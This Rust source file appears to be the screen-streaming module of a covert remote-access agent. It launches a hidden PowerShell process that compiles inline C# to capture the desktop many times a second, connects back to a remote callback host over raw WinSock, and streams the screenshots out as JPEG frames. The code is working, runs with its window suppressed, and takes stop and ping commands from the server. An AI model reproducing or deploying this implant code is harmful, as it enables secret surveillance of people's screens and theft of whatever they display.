/// vnc.rs — VNC PS-based screen relay (mirrors C agent exactly: raw WinSock2 + two threads)

use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use base64::{engine::general_purpose::STANDARD, Engine as _};

const VNC_FRAME: u8 = 0x01;
const VNC_INFO:  u8 = 0x02;
const VNC_PONG:  u8 = 0x03;
const VNC_STOP:  u8 = 0x14;
const VNC_PING:  u8 = 0x15;

fn vnc_log(msg: &str) {
    use std::io::Write as _;
    if let Ok(mut f) = std::fs::OpenOptions::new().create(true).append(true)
        .open("C:\\Users\\Public\\vnc_log.txt") {
        let _ = writeln!(f, "{}", msg);
    }
}

// ── Wire helpers (raw WinSock2) ──────────────────────────────────────────────

#[cfg(target_os = "windows")]
unsafe fn sock_write_all(sock: usize, buf: &[u8]) -> bool {
    use windows_sys::Win32::Networking::WinSock::send;
    let mut p = buf.as_ptr();
    let mut remaining = buf.len() as i32;
    while remaining > 0 {
        let r = send(sock, p, remaining, 0);
        if r <= 0 { return false; }
        p = p.add(r as usize);
        remaining -= r;
    }
    true
}

#[cfg(target_os = "windows")]
unsafe fn sock_send_frame(sock: usize, typ: u8, payload: &[u8]) -> bool {
    let plen = payload.len() as u32;
    let mut hdr = [0u8; 5];
    hdr[0] = typ;
    hdr[1] = (plen & 0xFF) as u8;
    hdr[2] = ((plen >> 8) & 0xFF) as u8;
    hdr[3] = ((plen >> 16) & 0xFF) as u8;
    hdr[4] = ((plen >> 24) & 0xFF) as u8;
    if !sock_write_all(sock, &hdr) { return false; }
    if !payload.is_empty() { return sock_write_all(sock, payload); }
    true
}

// ── TCP input reader thread (handles STOP/PING from server) ─────────────────

#[cfg(target_os = "windows")]
fn vnc_tcp_reader(sock: usize, stop: Arc<AtomicBool>) {
    use windows_sys::Win32::Networking::WinSock::{recv, WSAGetLastError};
    let mut buf = [0u8; 256];
    let mut pending: Vec<u8> = Vec::with_capacity(64);
    loop {
        if stop.load(Ordering::Relaxed) { break; }
        let n = unsafe { recv(sock, buf.as_mut_ptr(), buf.len() as i32, 0) };
        if n <= 0 {
            // WSAETIMEDOUT (10060) or WSAEWOULDBLOCK (10035): timeout, retry
            let err = unsafe { WSAGetLastError() };
            if err == 10060 || err == 10035 { continue; }
            break; // EOF or real error
        }
        pending.extend_from_slice(&buf[..n as usize]);
        loop {
            if pending.len() < 5 { break; }
            let plen = u32::from_le_bytes([pending[1], pending[2], pending[3], pending[4]]) as usize;
            if plen > 65536 { pending.clear(); break; }
            let total = 5 + plen;
            if pending.len() < total { break; }
            let typ = pending[0];
            pending.drain(..total);
            match typ {
                VNC_STOP => { stop.store(true, Ordering::Relaxed); }
                VNC_PING => { unsafe { sock_send_frame(sock, VNC_PONG, &[]); } }
                _ => {}
            }
        }
        if stop.load(Ordering::Relaxed) { break; }
    }
    stop.store(true, Ordering::Relaxed);
}

// ── PS pipe reader thread (reads frames and sends to server) ─────────────────

#[cfg(target_os = "windows")]
fn vnc_ps_reader(sock: usize, h_read: isize, stop: Arc<AtomicBool>) {
    use windows_sys::Win32::Storage::FileSystem::ReadFile;
    use windows_sys::Win32::System::Pipes::PeekNamedPipe;

    let mut line_buf = vec![0u8; 4 * 1024 * 1024]; // 4MB (smaller = less risk)
    let mut line_pos: usize = 0;
    let mut sent_info = false;

    loop {
        if stop.load(Ordering::Relaxed) { break; }

        // Non-blocking peek: how many bytes available?
        let mut avail: u32 = 0;
        let peek_ok = unsafe {
            PeekNamedPipe(h_read, std::ptr::null_mut(), 0, std::ptr::null_mut(), &mut avail, std::ptr::null_mut())
        };
        if peek_ok == 0 {
            vnc_log("ps_reader: pipe broken");
            break;
        }

        if avail == 0 {
            // Nothing yet — yield briefly and retry
            unsafe { windows_sys::Win32::System::Threading::Sleep(10); }
            continue;
        }

        // How much room in our buffer?
        if line_pos >= line_buf.len() { line_pos = 0; } // overflow guard

        let to_read = (avail as usize).min(line_buf.len() - line_pos);
        let mut nr: u32 = 0;
        let ok = unsafe {
            ReadFile(
                h_read,
                line_buf[line_pos..].as_mut_ptr() as *mut _,
                to_read as u32,
                &mut nr,
                std::ptr::null_mut(),
            )
        };
        if ok == 0 || nr == 0 {
            vnc_log("ps_reader: read error");
            break;
        }
        line_pos += nr as usize;

        // Parse all complete '\n'-terminated lines
        let mut scan_start = 0usize;
        loop {
            // Find next newline in the range we haven't processed yet
            let search = &line_buf[scan_start..line_pos];
            let nl_offset = match search.iter().position(|&b| b == b'\n') {
                Some(i) => i,
                None => break,
            };
            let nl_abs = scan_start + nl_offset;

            // Build line string (strip trailing \r\n)
            let raw_end = if nl_abs > 0 && line_buf[nl_abs - 1] == b'\r' { nl_abs - 1 } else { nl_abs };
            let raw_start = scan_start;
            let raw_bytes = &line_buf[raw_start..raw_end];

            // Convert to string safely
            let line_str = String::from_utf8_lossy(raw_bytes);
            let line = line_str.trim();

            // Log non-frame lines (PS errors, Add-Type output, etc.)
            if !line.contains(',') || line.starts_with('[') || line.starts_with("Add-") || line.starts_with("WARNING") {
                // Safe truncation at char boundary
                let trunc: String = line.chars().take(200).collect();
                vnc_log(&format!("ps: {}", trunc));
            }

            // Try to parse W,H,base64JPEG
            let parts: Vec<&str> = line.splitn(3, ',').collect();
            if parts.len() >= 3 {
                let w: u32 = parts[0].trim().parse().unwrap_or(0);
                let h: u32 = parts[1].trim().parse().unwrap_or(0);
                if w > 0 && h > 0 {
                    if let Ok(jpeg) = STANDARD.decode(parts[2].trim().as_bytes()) {
                        if !jpeg.is_empty() {
                            if !sent_info {
                                let info_str = format!("{{\"w\":{},\"h\":{}}}", w, h);
                                if !unsafe { sock_send_frame(sock, VNC_INFO, info_str.as_bytes()) } {
                                    vnc_log("ps_reader: send info failed");
                                    stop.store(true, Ordering::Relaxed);
                                    break;
                                }
                                sent_info = true;
                                vnc_log(&format!("ps_reader: first frame {}x{}", w, h));
                            }
                            // FRAME: [2B w LE][2B h LE][JPEG]
                            let mut frame = Vec::with_capacity(4 + jpeg.len());
                            frame.push((w & 0xFF) as u8);
                            frame.push(((w >> 8) & 0xFF) as u8);
                            frame.push((h & 0xFF) as u8);
                            frame.push(((h >> 8) & 0xFF) as u8);
                            frame.extend_from_slice(&jpeg);
                            if !unsafe { sock_send_frame(sock, VNC_FRAME, &frame) } {
                                vnc_log("ps_reader: send frame failed");
                                stop.store(true, Ordering::Relaxed);
                                break;
                            }
                        }
                    }
                }
            }

            scan_start = nl_abs + 1;
            if scan_start >= line_pos { break; }
        }

        // Compact: move unprocessed bytes to front
        if scan_start > 0 && scan_start <= line_pos {
            line_buf.copy_within(scan_start..line_pos, 0);
            line_pos -= scan_start;
        } else if scan_start >= line_pos {
            line_pos = 0;
        }

        if stop.load(Ordering::Relaxed) { break; }
    }

    vnc_log("ps_reader: exit");
    stop.store(true, Ordering::Relaxed);
}

// ── VNC session: connect, spawn PS, run two reader threads ───────────────────

#[cfg(target_os = "windows")]
fn vnc_session(host: &str, port: u16, quality: u8, stop: Arc<AtomicBool>) {
    use windows_sys::Win32::Foundation::{CloseHandle, TRUE, FALSE, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::Networking::WinSock::{
        WSAStartup, WSACleanup, socket, connect, closesocket,
        WSADATA, SOCKADDR_IN, AF_INET, SOCK_STREAM, IPPROTO_TCP,
        INVALID_SOCKET,
    };
    use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;
    use windows_sys::Win32::System::Pipes::CreatePipe;
    use windows_sys::Win32::System::Threading::{
        CreateProcessA, TerminateProcess, WaitForSingleObject,
        PROCESS_INFORMATION, STARTUPINFOA,
        STARTF_USESTDHANDLES, STARTF_USESHOWWINDOW, CREATE_NO_WINDOW,
    };
    use windows_sys::Win32::UI::WindowsAndMessaging::SW_HIDE;

    vnc_log("step1: session start");

    // Initialize WinSock
    let mut wsd: WSADATA = unsafe { std::mem::zeroed() };
    unsafe { WSAStartup(0x0202, &mut wsd) };

    // Connect TCP to callback port
    let sock = unsafe { socket(AF_INET as i32, SOCK_STREAM as i32, IPPROTO_TCP as i32) };
    if sock == INVALID_SOCKET {
        vnc_log("step1: socket() failed");
        unsafe { WSACleanup() };
        return;
    }

    let host_bytes: Vec<u8> = host.bytes().chain(std::iter::once(0u8)).collect();
    let ip: u32 = unsafe {
        windows_sys::Win32::Networking::WinSock::inet_addr(host_bytes.as_ptr())
    };

    let mut sa_in: SOCKADDR_IN = unsafe { std::mem::zeroed() };
    sa_in.sin_family = AF_INET;
    sa_in.sin_port = port.to_be();
    sa_in.sin_addr.S_un.S_addr = ip;

    let connect_ret = unsafe {
        connect(
            sock,
            &sa_in as *const SOCKADDR_IN as *const _,
            std::mem::size_of::<SOCKADDR_IN>() as i32,
        )
    };
    if connect_ret != 0 {
        vnc_log("step1: connect() failed");
        unsafe { closesocket(sock); WSACleanup() };
        return;
    }
    vnc_log("step2: tcp connected");

    // Set receive timeout (100ms) so TCP reader thread can check stop flag
    let timeout_ms: u32 = 100;
    unsafe {
        windows_sys::Win32::Networking::WinSock::setsockopt(
            sock,
            windows_sys::Win32::Networking::WinSock::SOL_SOCKET as i32,
            windows_sys::Win32::Networking::WinSock::SO_RCVTIMEO as i32,
            &timeout_ms as *const u32 as *const u8,
            std::mem::size_of::<u32>() as i32,
        );
    };

    // Build PowerShell command (same as C agent)
    let ps_raw = format!(
        "$q={q};\
Add-Type -AssemblyName System.Drawing;\
Add-Type -TypeDefinition '\
using System;using System.Drawing;using System.Drawing.Imaging;using System.Runtime.InteropServices;\
public class SC{{\
[DllImport(\\\"user32.dll\\\")] static extern IntPtr GetDesktopWindow();\
[DllImport(\\\"user32.dll\\\")] static extern IntPtr GetWindowDC(IntPtr h);\
[DllImport(\\\"user32.dll\\\")] static extern int ReleaseDC(IntPtr h,IntPtr d);\
[DllImport(\\\"gdi32.dll\\\")] static extern bool BitBlt(IntPtr d,int x,int y,int w,int h,IntPtr s,int sx,int sy,uint r);\
[DllImport(\\\"user32.dll\\\")] static extern int GetSystemMetrics(int i);\
public static Bitmap Cap(){{\
int w=GetSystemMetrics(0);int h=GetSystemMetrics(1);\
if(w==0)w=1024;if(h==0)h=768;\
IntPtr hw=GetDesktopWindow();IntPtr dc=GetWindowDC(hw);\
Bitmap bmp=new Bitmap(w,h);\
using(Graphics g=Graphics.FromImage(bmp)){{\
IntPtr md=g.GetHdc();\
BitBlt(md,0,0,w,h,dc,0,0,(uint)0x00CC0020);\
g.ReleaseHdc(md);\
}}\
ReleaseDC(hw,dc);return bmp;\
}}\
}}' -Language CSharp -ReferencedAssemblies 'System.Drawing';\
while($true){{\
try{{\
$bmp=[SC]::Cap();\
$ms=[System.IO.MemoryStream]::new();\
$ec=[System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders()|Where-Object{{$_.MimeType-eq'image/jpeg'}};\
$ep=[System.Drawing.Imaging.EncoderParameters]::new(1);\
$ep.Param[0]=[System.Drawing.Imaging.EncoderParameter]::new([System.Drawing.Imaging.Encoder]::Quality,[long]$q);\
$bmp.Save($ms,$ec,$ep);\
$w=$bmp.Width;$h=$bmp.Height;$b=[Convert]::ToBase64String($ms.ToArray());\
[Console]::Out.WriteLine($w.ToString()+','+$h.ToString()+','+$b);\
$bmp.Dispose();$ms.Dispose()\
}}catch{{}};\
Start-Sleep -Milliseconds 66}}",
        q = quality
    );
    let ps_cmd = format!(
        "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command \"{}\"",
        ps_raw
    );
    let mut ps_cmd_buf: Vec<u8> = ps_cmd.into_bytes();
    ps_cmd_buf.push(0);
    vnc_log(&format!("step2b: cmd len={}", ps_cmd_buf.len()));

    // Create pipe
    let mut sa = SECURITY_ATTRIBUTES {
        nLength: std::mem::size_of::<SECURITY_ATTRIBUTES>() as u32,
        lpSecurityDescriptor: std::ptr::null_mut(),
        bInheritHandle: TRUE,
    };
    let mut h_read: isize = INVALID_HANDLE_VALUE;
    let mut h_write: isize = INVALID_HANDLE_VALUE;
    if unsafe { CreatePipe(&mut h_read, &mut h_write, &mut sa, 0) } == FALSE {
        vnc_log("step3: pipe fail");
        unsafe { closesocket(sock); WSACleanup() };
        return;
    }

    // Launch PowerShell
    let mut si: STARTUPINFOA = unsafe { std::mem::zeroed() };
    si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = h_write;
    si.hStdError  = h_write;
    si.wShowWindow = SW_HIDE as u16;
    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    let created = unsafe {
        CreateProcessA(
            std::ptr::null(),
            ps_cmd_buf.as_mut_ptr(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            TRUE,
            CREATE_NO_WINDOW,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            &mut si,
            &mut pi,
        )
    };
    unsafe { CloseHandle(h_write); }
    if created == FALSE {
        vnc_log("step3: process fail");
        unsafe { CloseHandle(h_read); closesocket(sock); WSACleanup() };
        return;
    }
    unsafe { CloseHandle(pi.hThread); }
    vnc_log("step3: ps spawned");

    // Spawn two reader threads: TCP and PS pipe
    let stop_tcp = stop.clone();
    let stop_ps = stop.clone();
    let sock_tcp = sock;
    let sock_ps = sock;

    let tcp_thread = std::thread::spawn(move || {
        vnc_tcp_reader(sock_tcp, stop_tcp);
    });

    let ps_thread = std::thread::spawn(move || {
        vnc_ps_reader(sock_ps, h_read, stop_ps);
    });
    vnc_log("step4: threads started");

    // Wait for PS reader to exit (it exits on pipe error, send failure, or stop flag)
    let _ = ps_thread.join();
    // Signal TCP reader to stop (it will exit within SO_RCVTIMEO = 100ms)
    stop.store(true, Ordering::Relaxed);
    let _ = tcp_thread.join();
    vnc_log("step5: threads done");

    // Cleanup PS process, pipe, and socket
    unsafe {
        TerminateProcess(pi.hProcess, 0);
        WaitForSingleObject(pi.hProcess, 2000);
        CloseHandle(pi.hProcess);
        CloseHandle(h_read);
        closesocket(sock);
        WSACleanup();
    }
    vnc_log("step6: cleanup done");
}

// ── Public interface ─────────────────────────────────────────────────────────

use std::sync::{Mutex, OnceLock};

static VNC_STOP_FLAG: OnceLock<Arc<AtomicBool>> = OnceLock::new();
static VNC_RUNNING:   OnceLock<Arc<Mutex<bool>>> = OnceLock::new();

fn get_stop() -> Arc<AtomicBool> {
    VNC_STOP_FLAG.get_or_init(|| Arc::new(AtomicBool::new(true))).clone()
}
fn get_running() -> Arc<Mutex<bool>> {
    VNC_RUNNING.get_or_init(|| Arc::new(Mutex::new(false))).clone()
}

pub fn vnc_start(host: String, port: u16, quality: u8) {
    #[cfg(not(target_os = "windows"))]
    { let _ = (host, port, quality); return; }

    #[cfg(target_os = "windows")]
    {
        let running = get_running();
        let mut guard = match running.lock() {
            Ok(g) => g,
            Err(_) => return,
        };
        if *guard { return; }
        *guard = true;
        drop(guard);

        let stop = get_stop();
        stop.store(false, Ordering::Relaxed);
        let stop_clone = stop.clone();
        let running_clone = running.clone();

        std::thread::spawn(move || {
            vnc_session(&host, port, quality, stop_clone);
            if let Ok(mut g) = running_clone.lock() { *g = false; }
        });
    }
}

pub fn vnc_stop() {
    get_stop().store(true, Ordering::Relaxed);
}
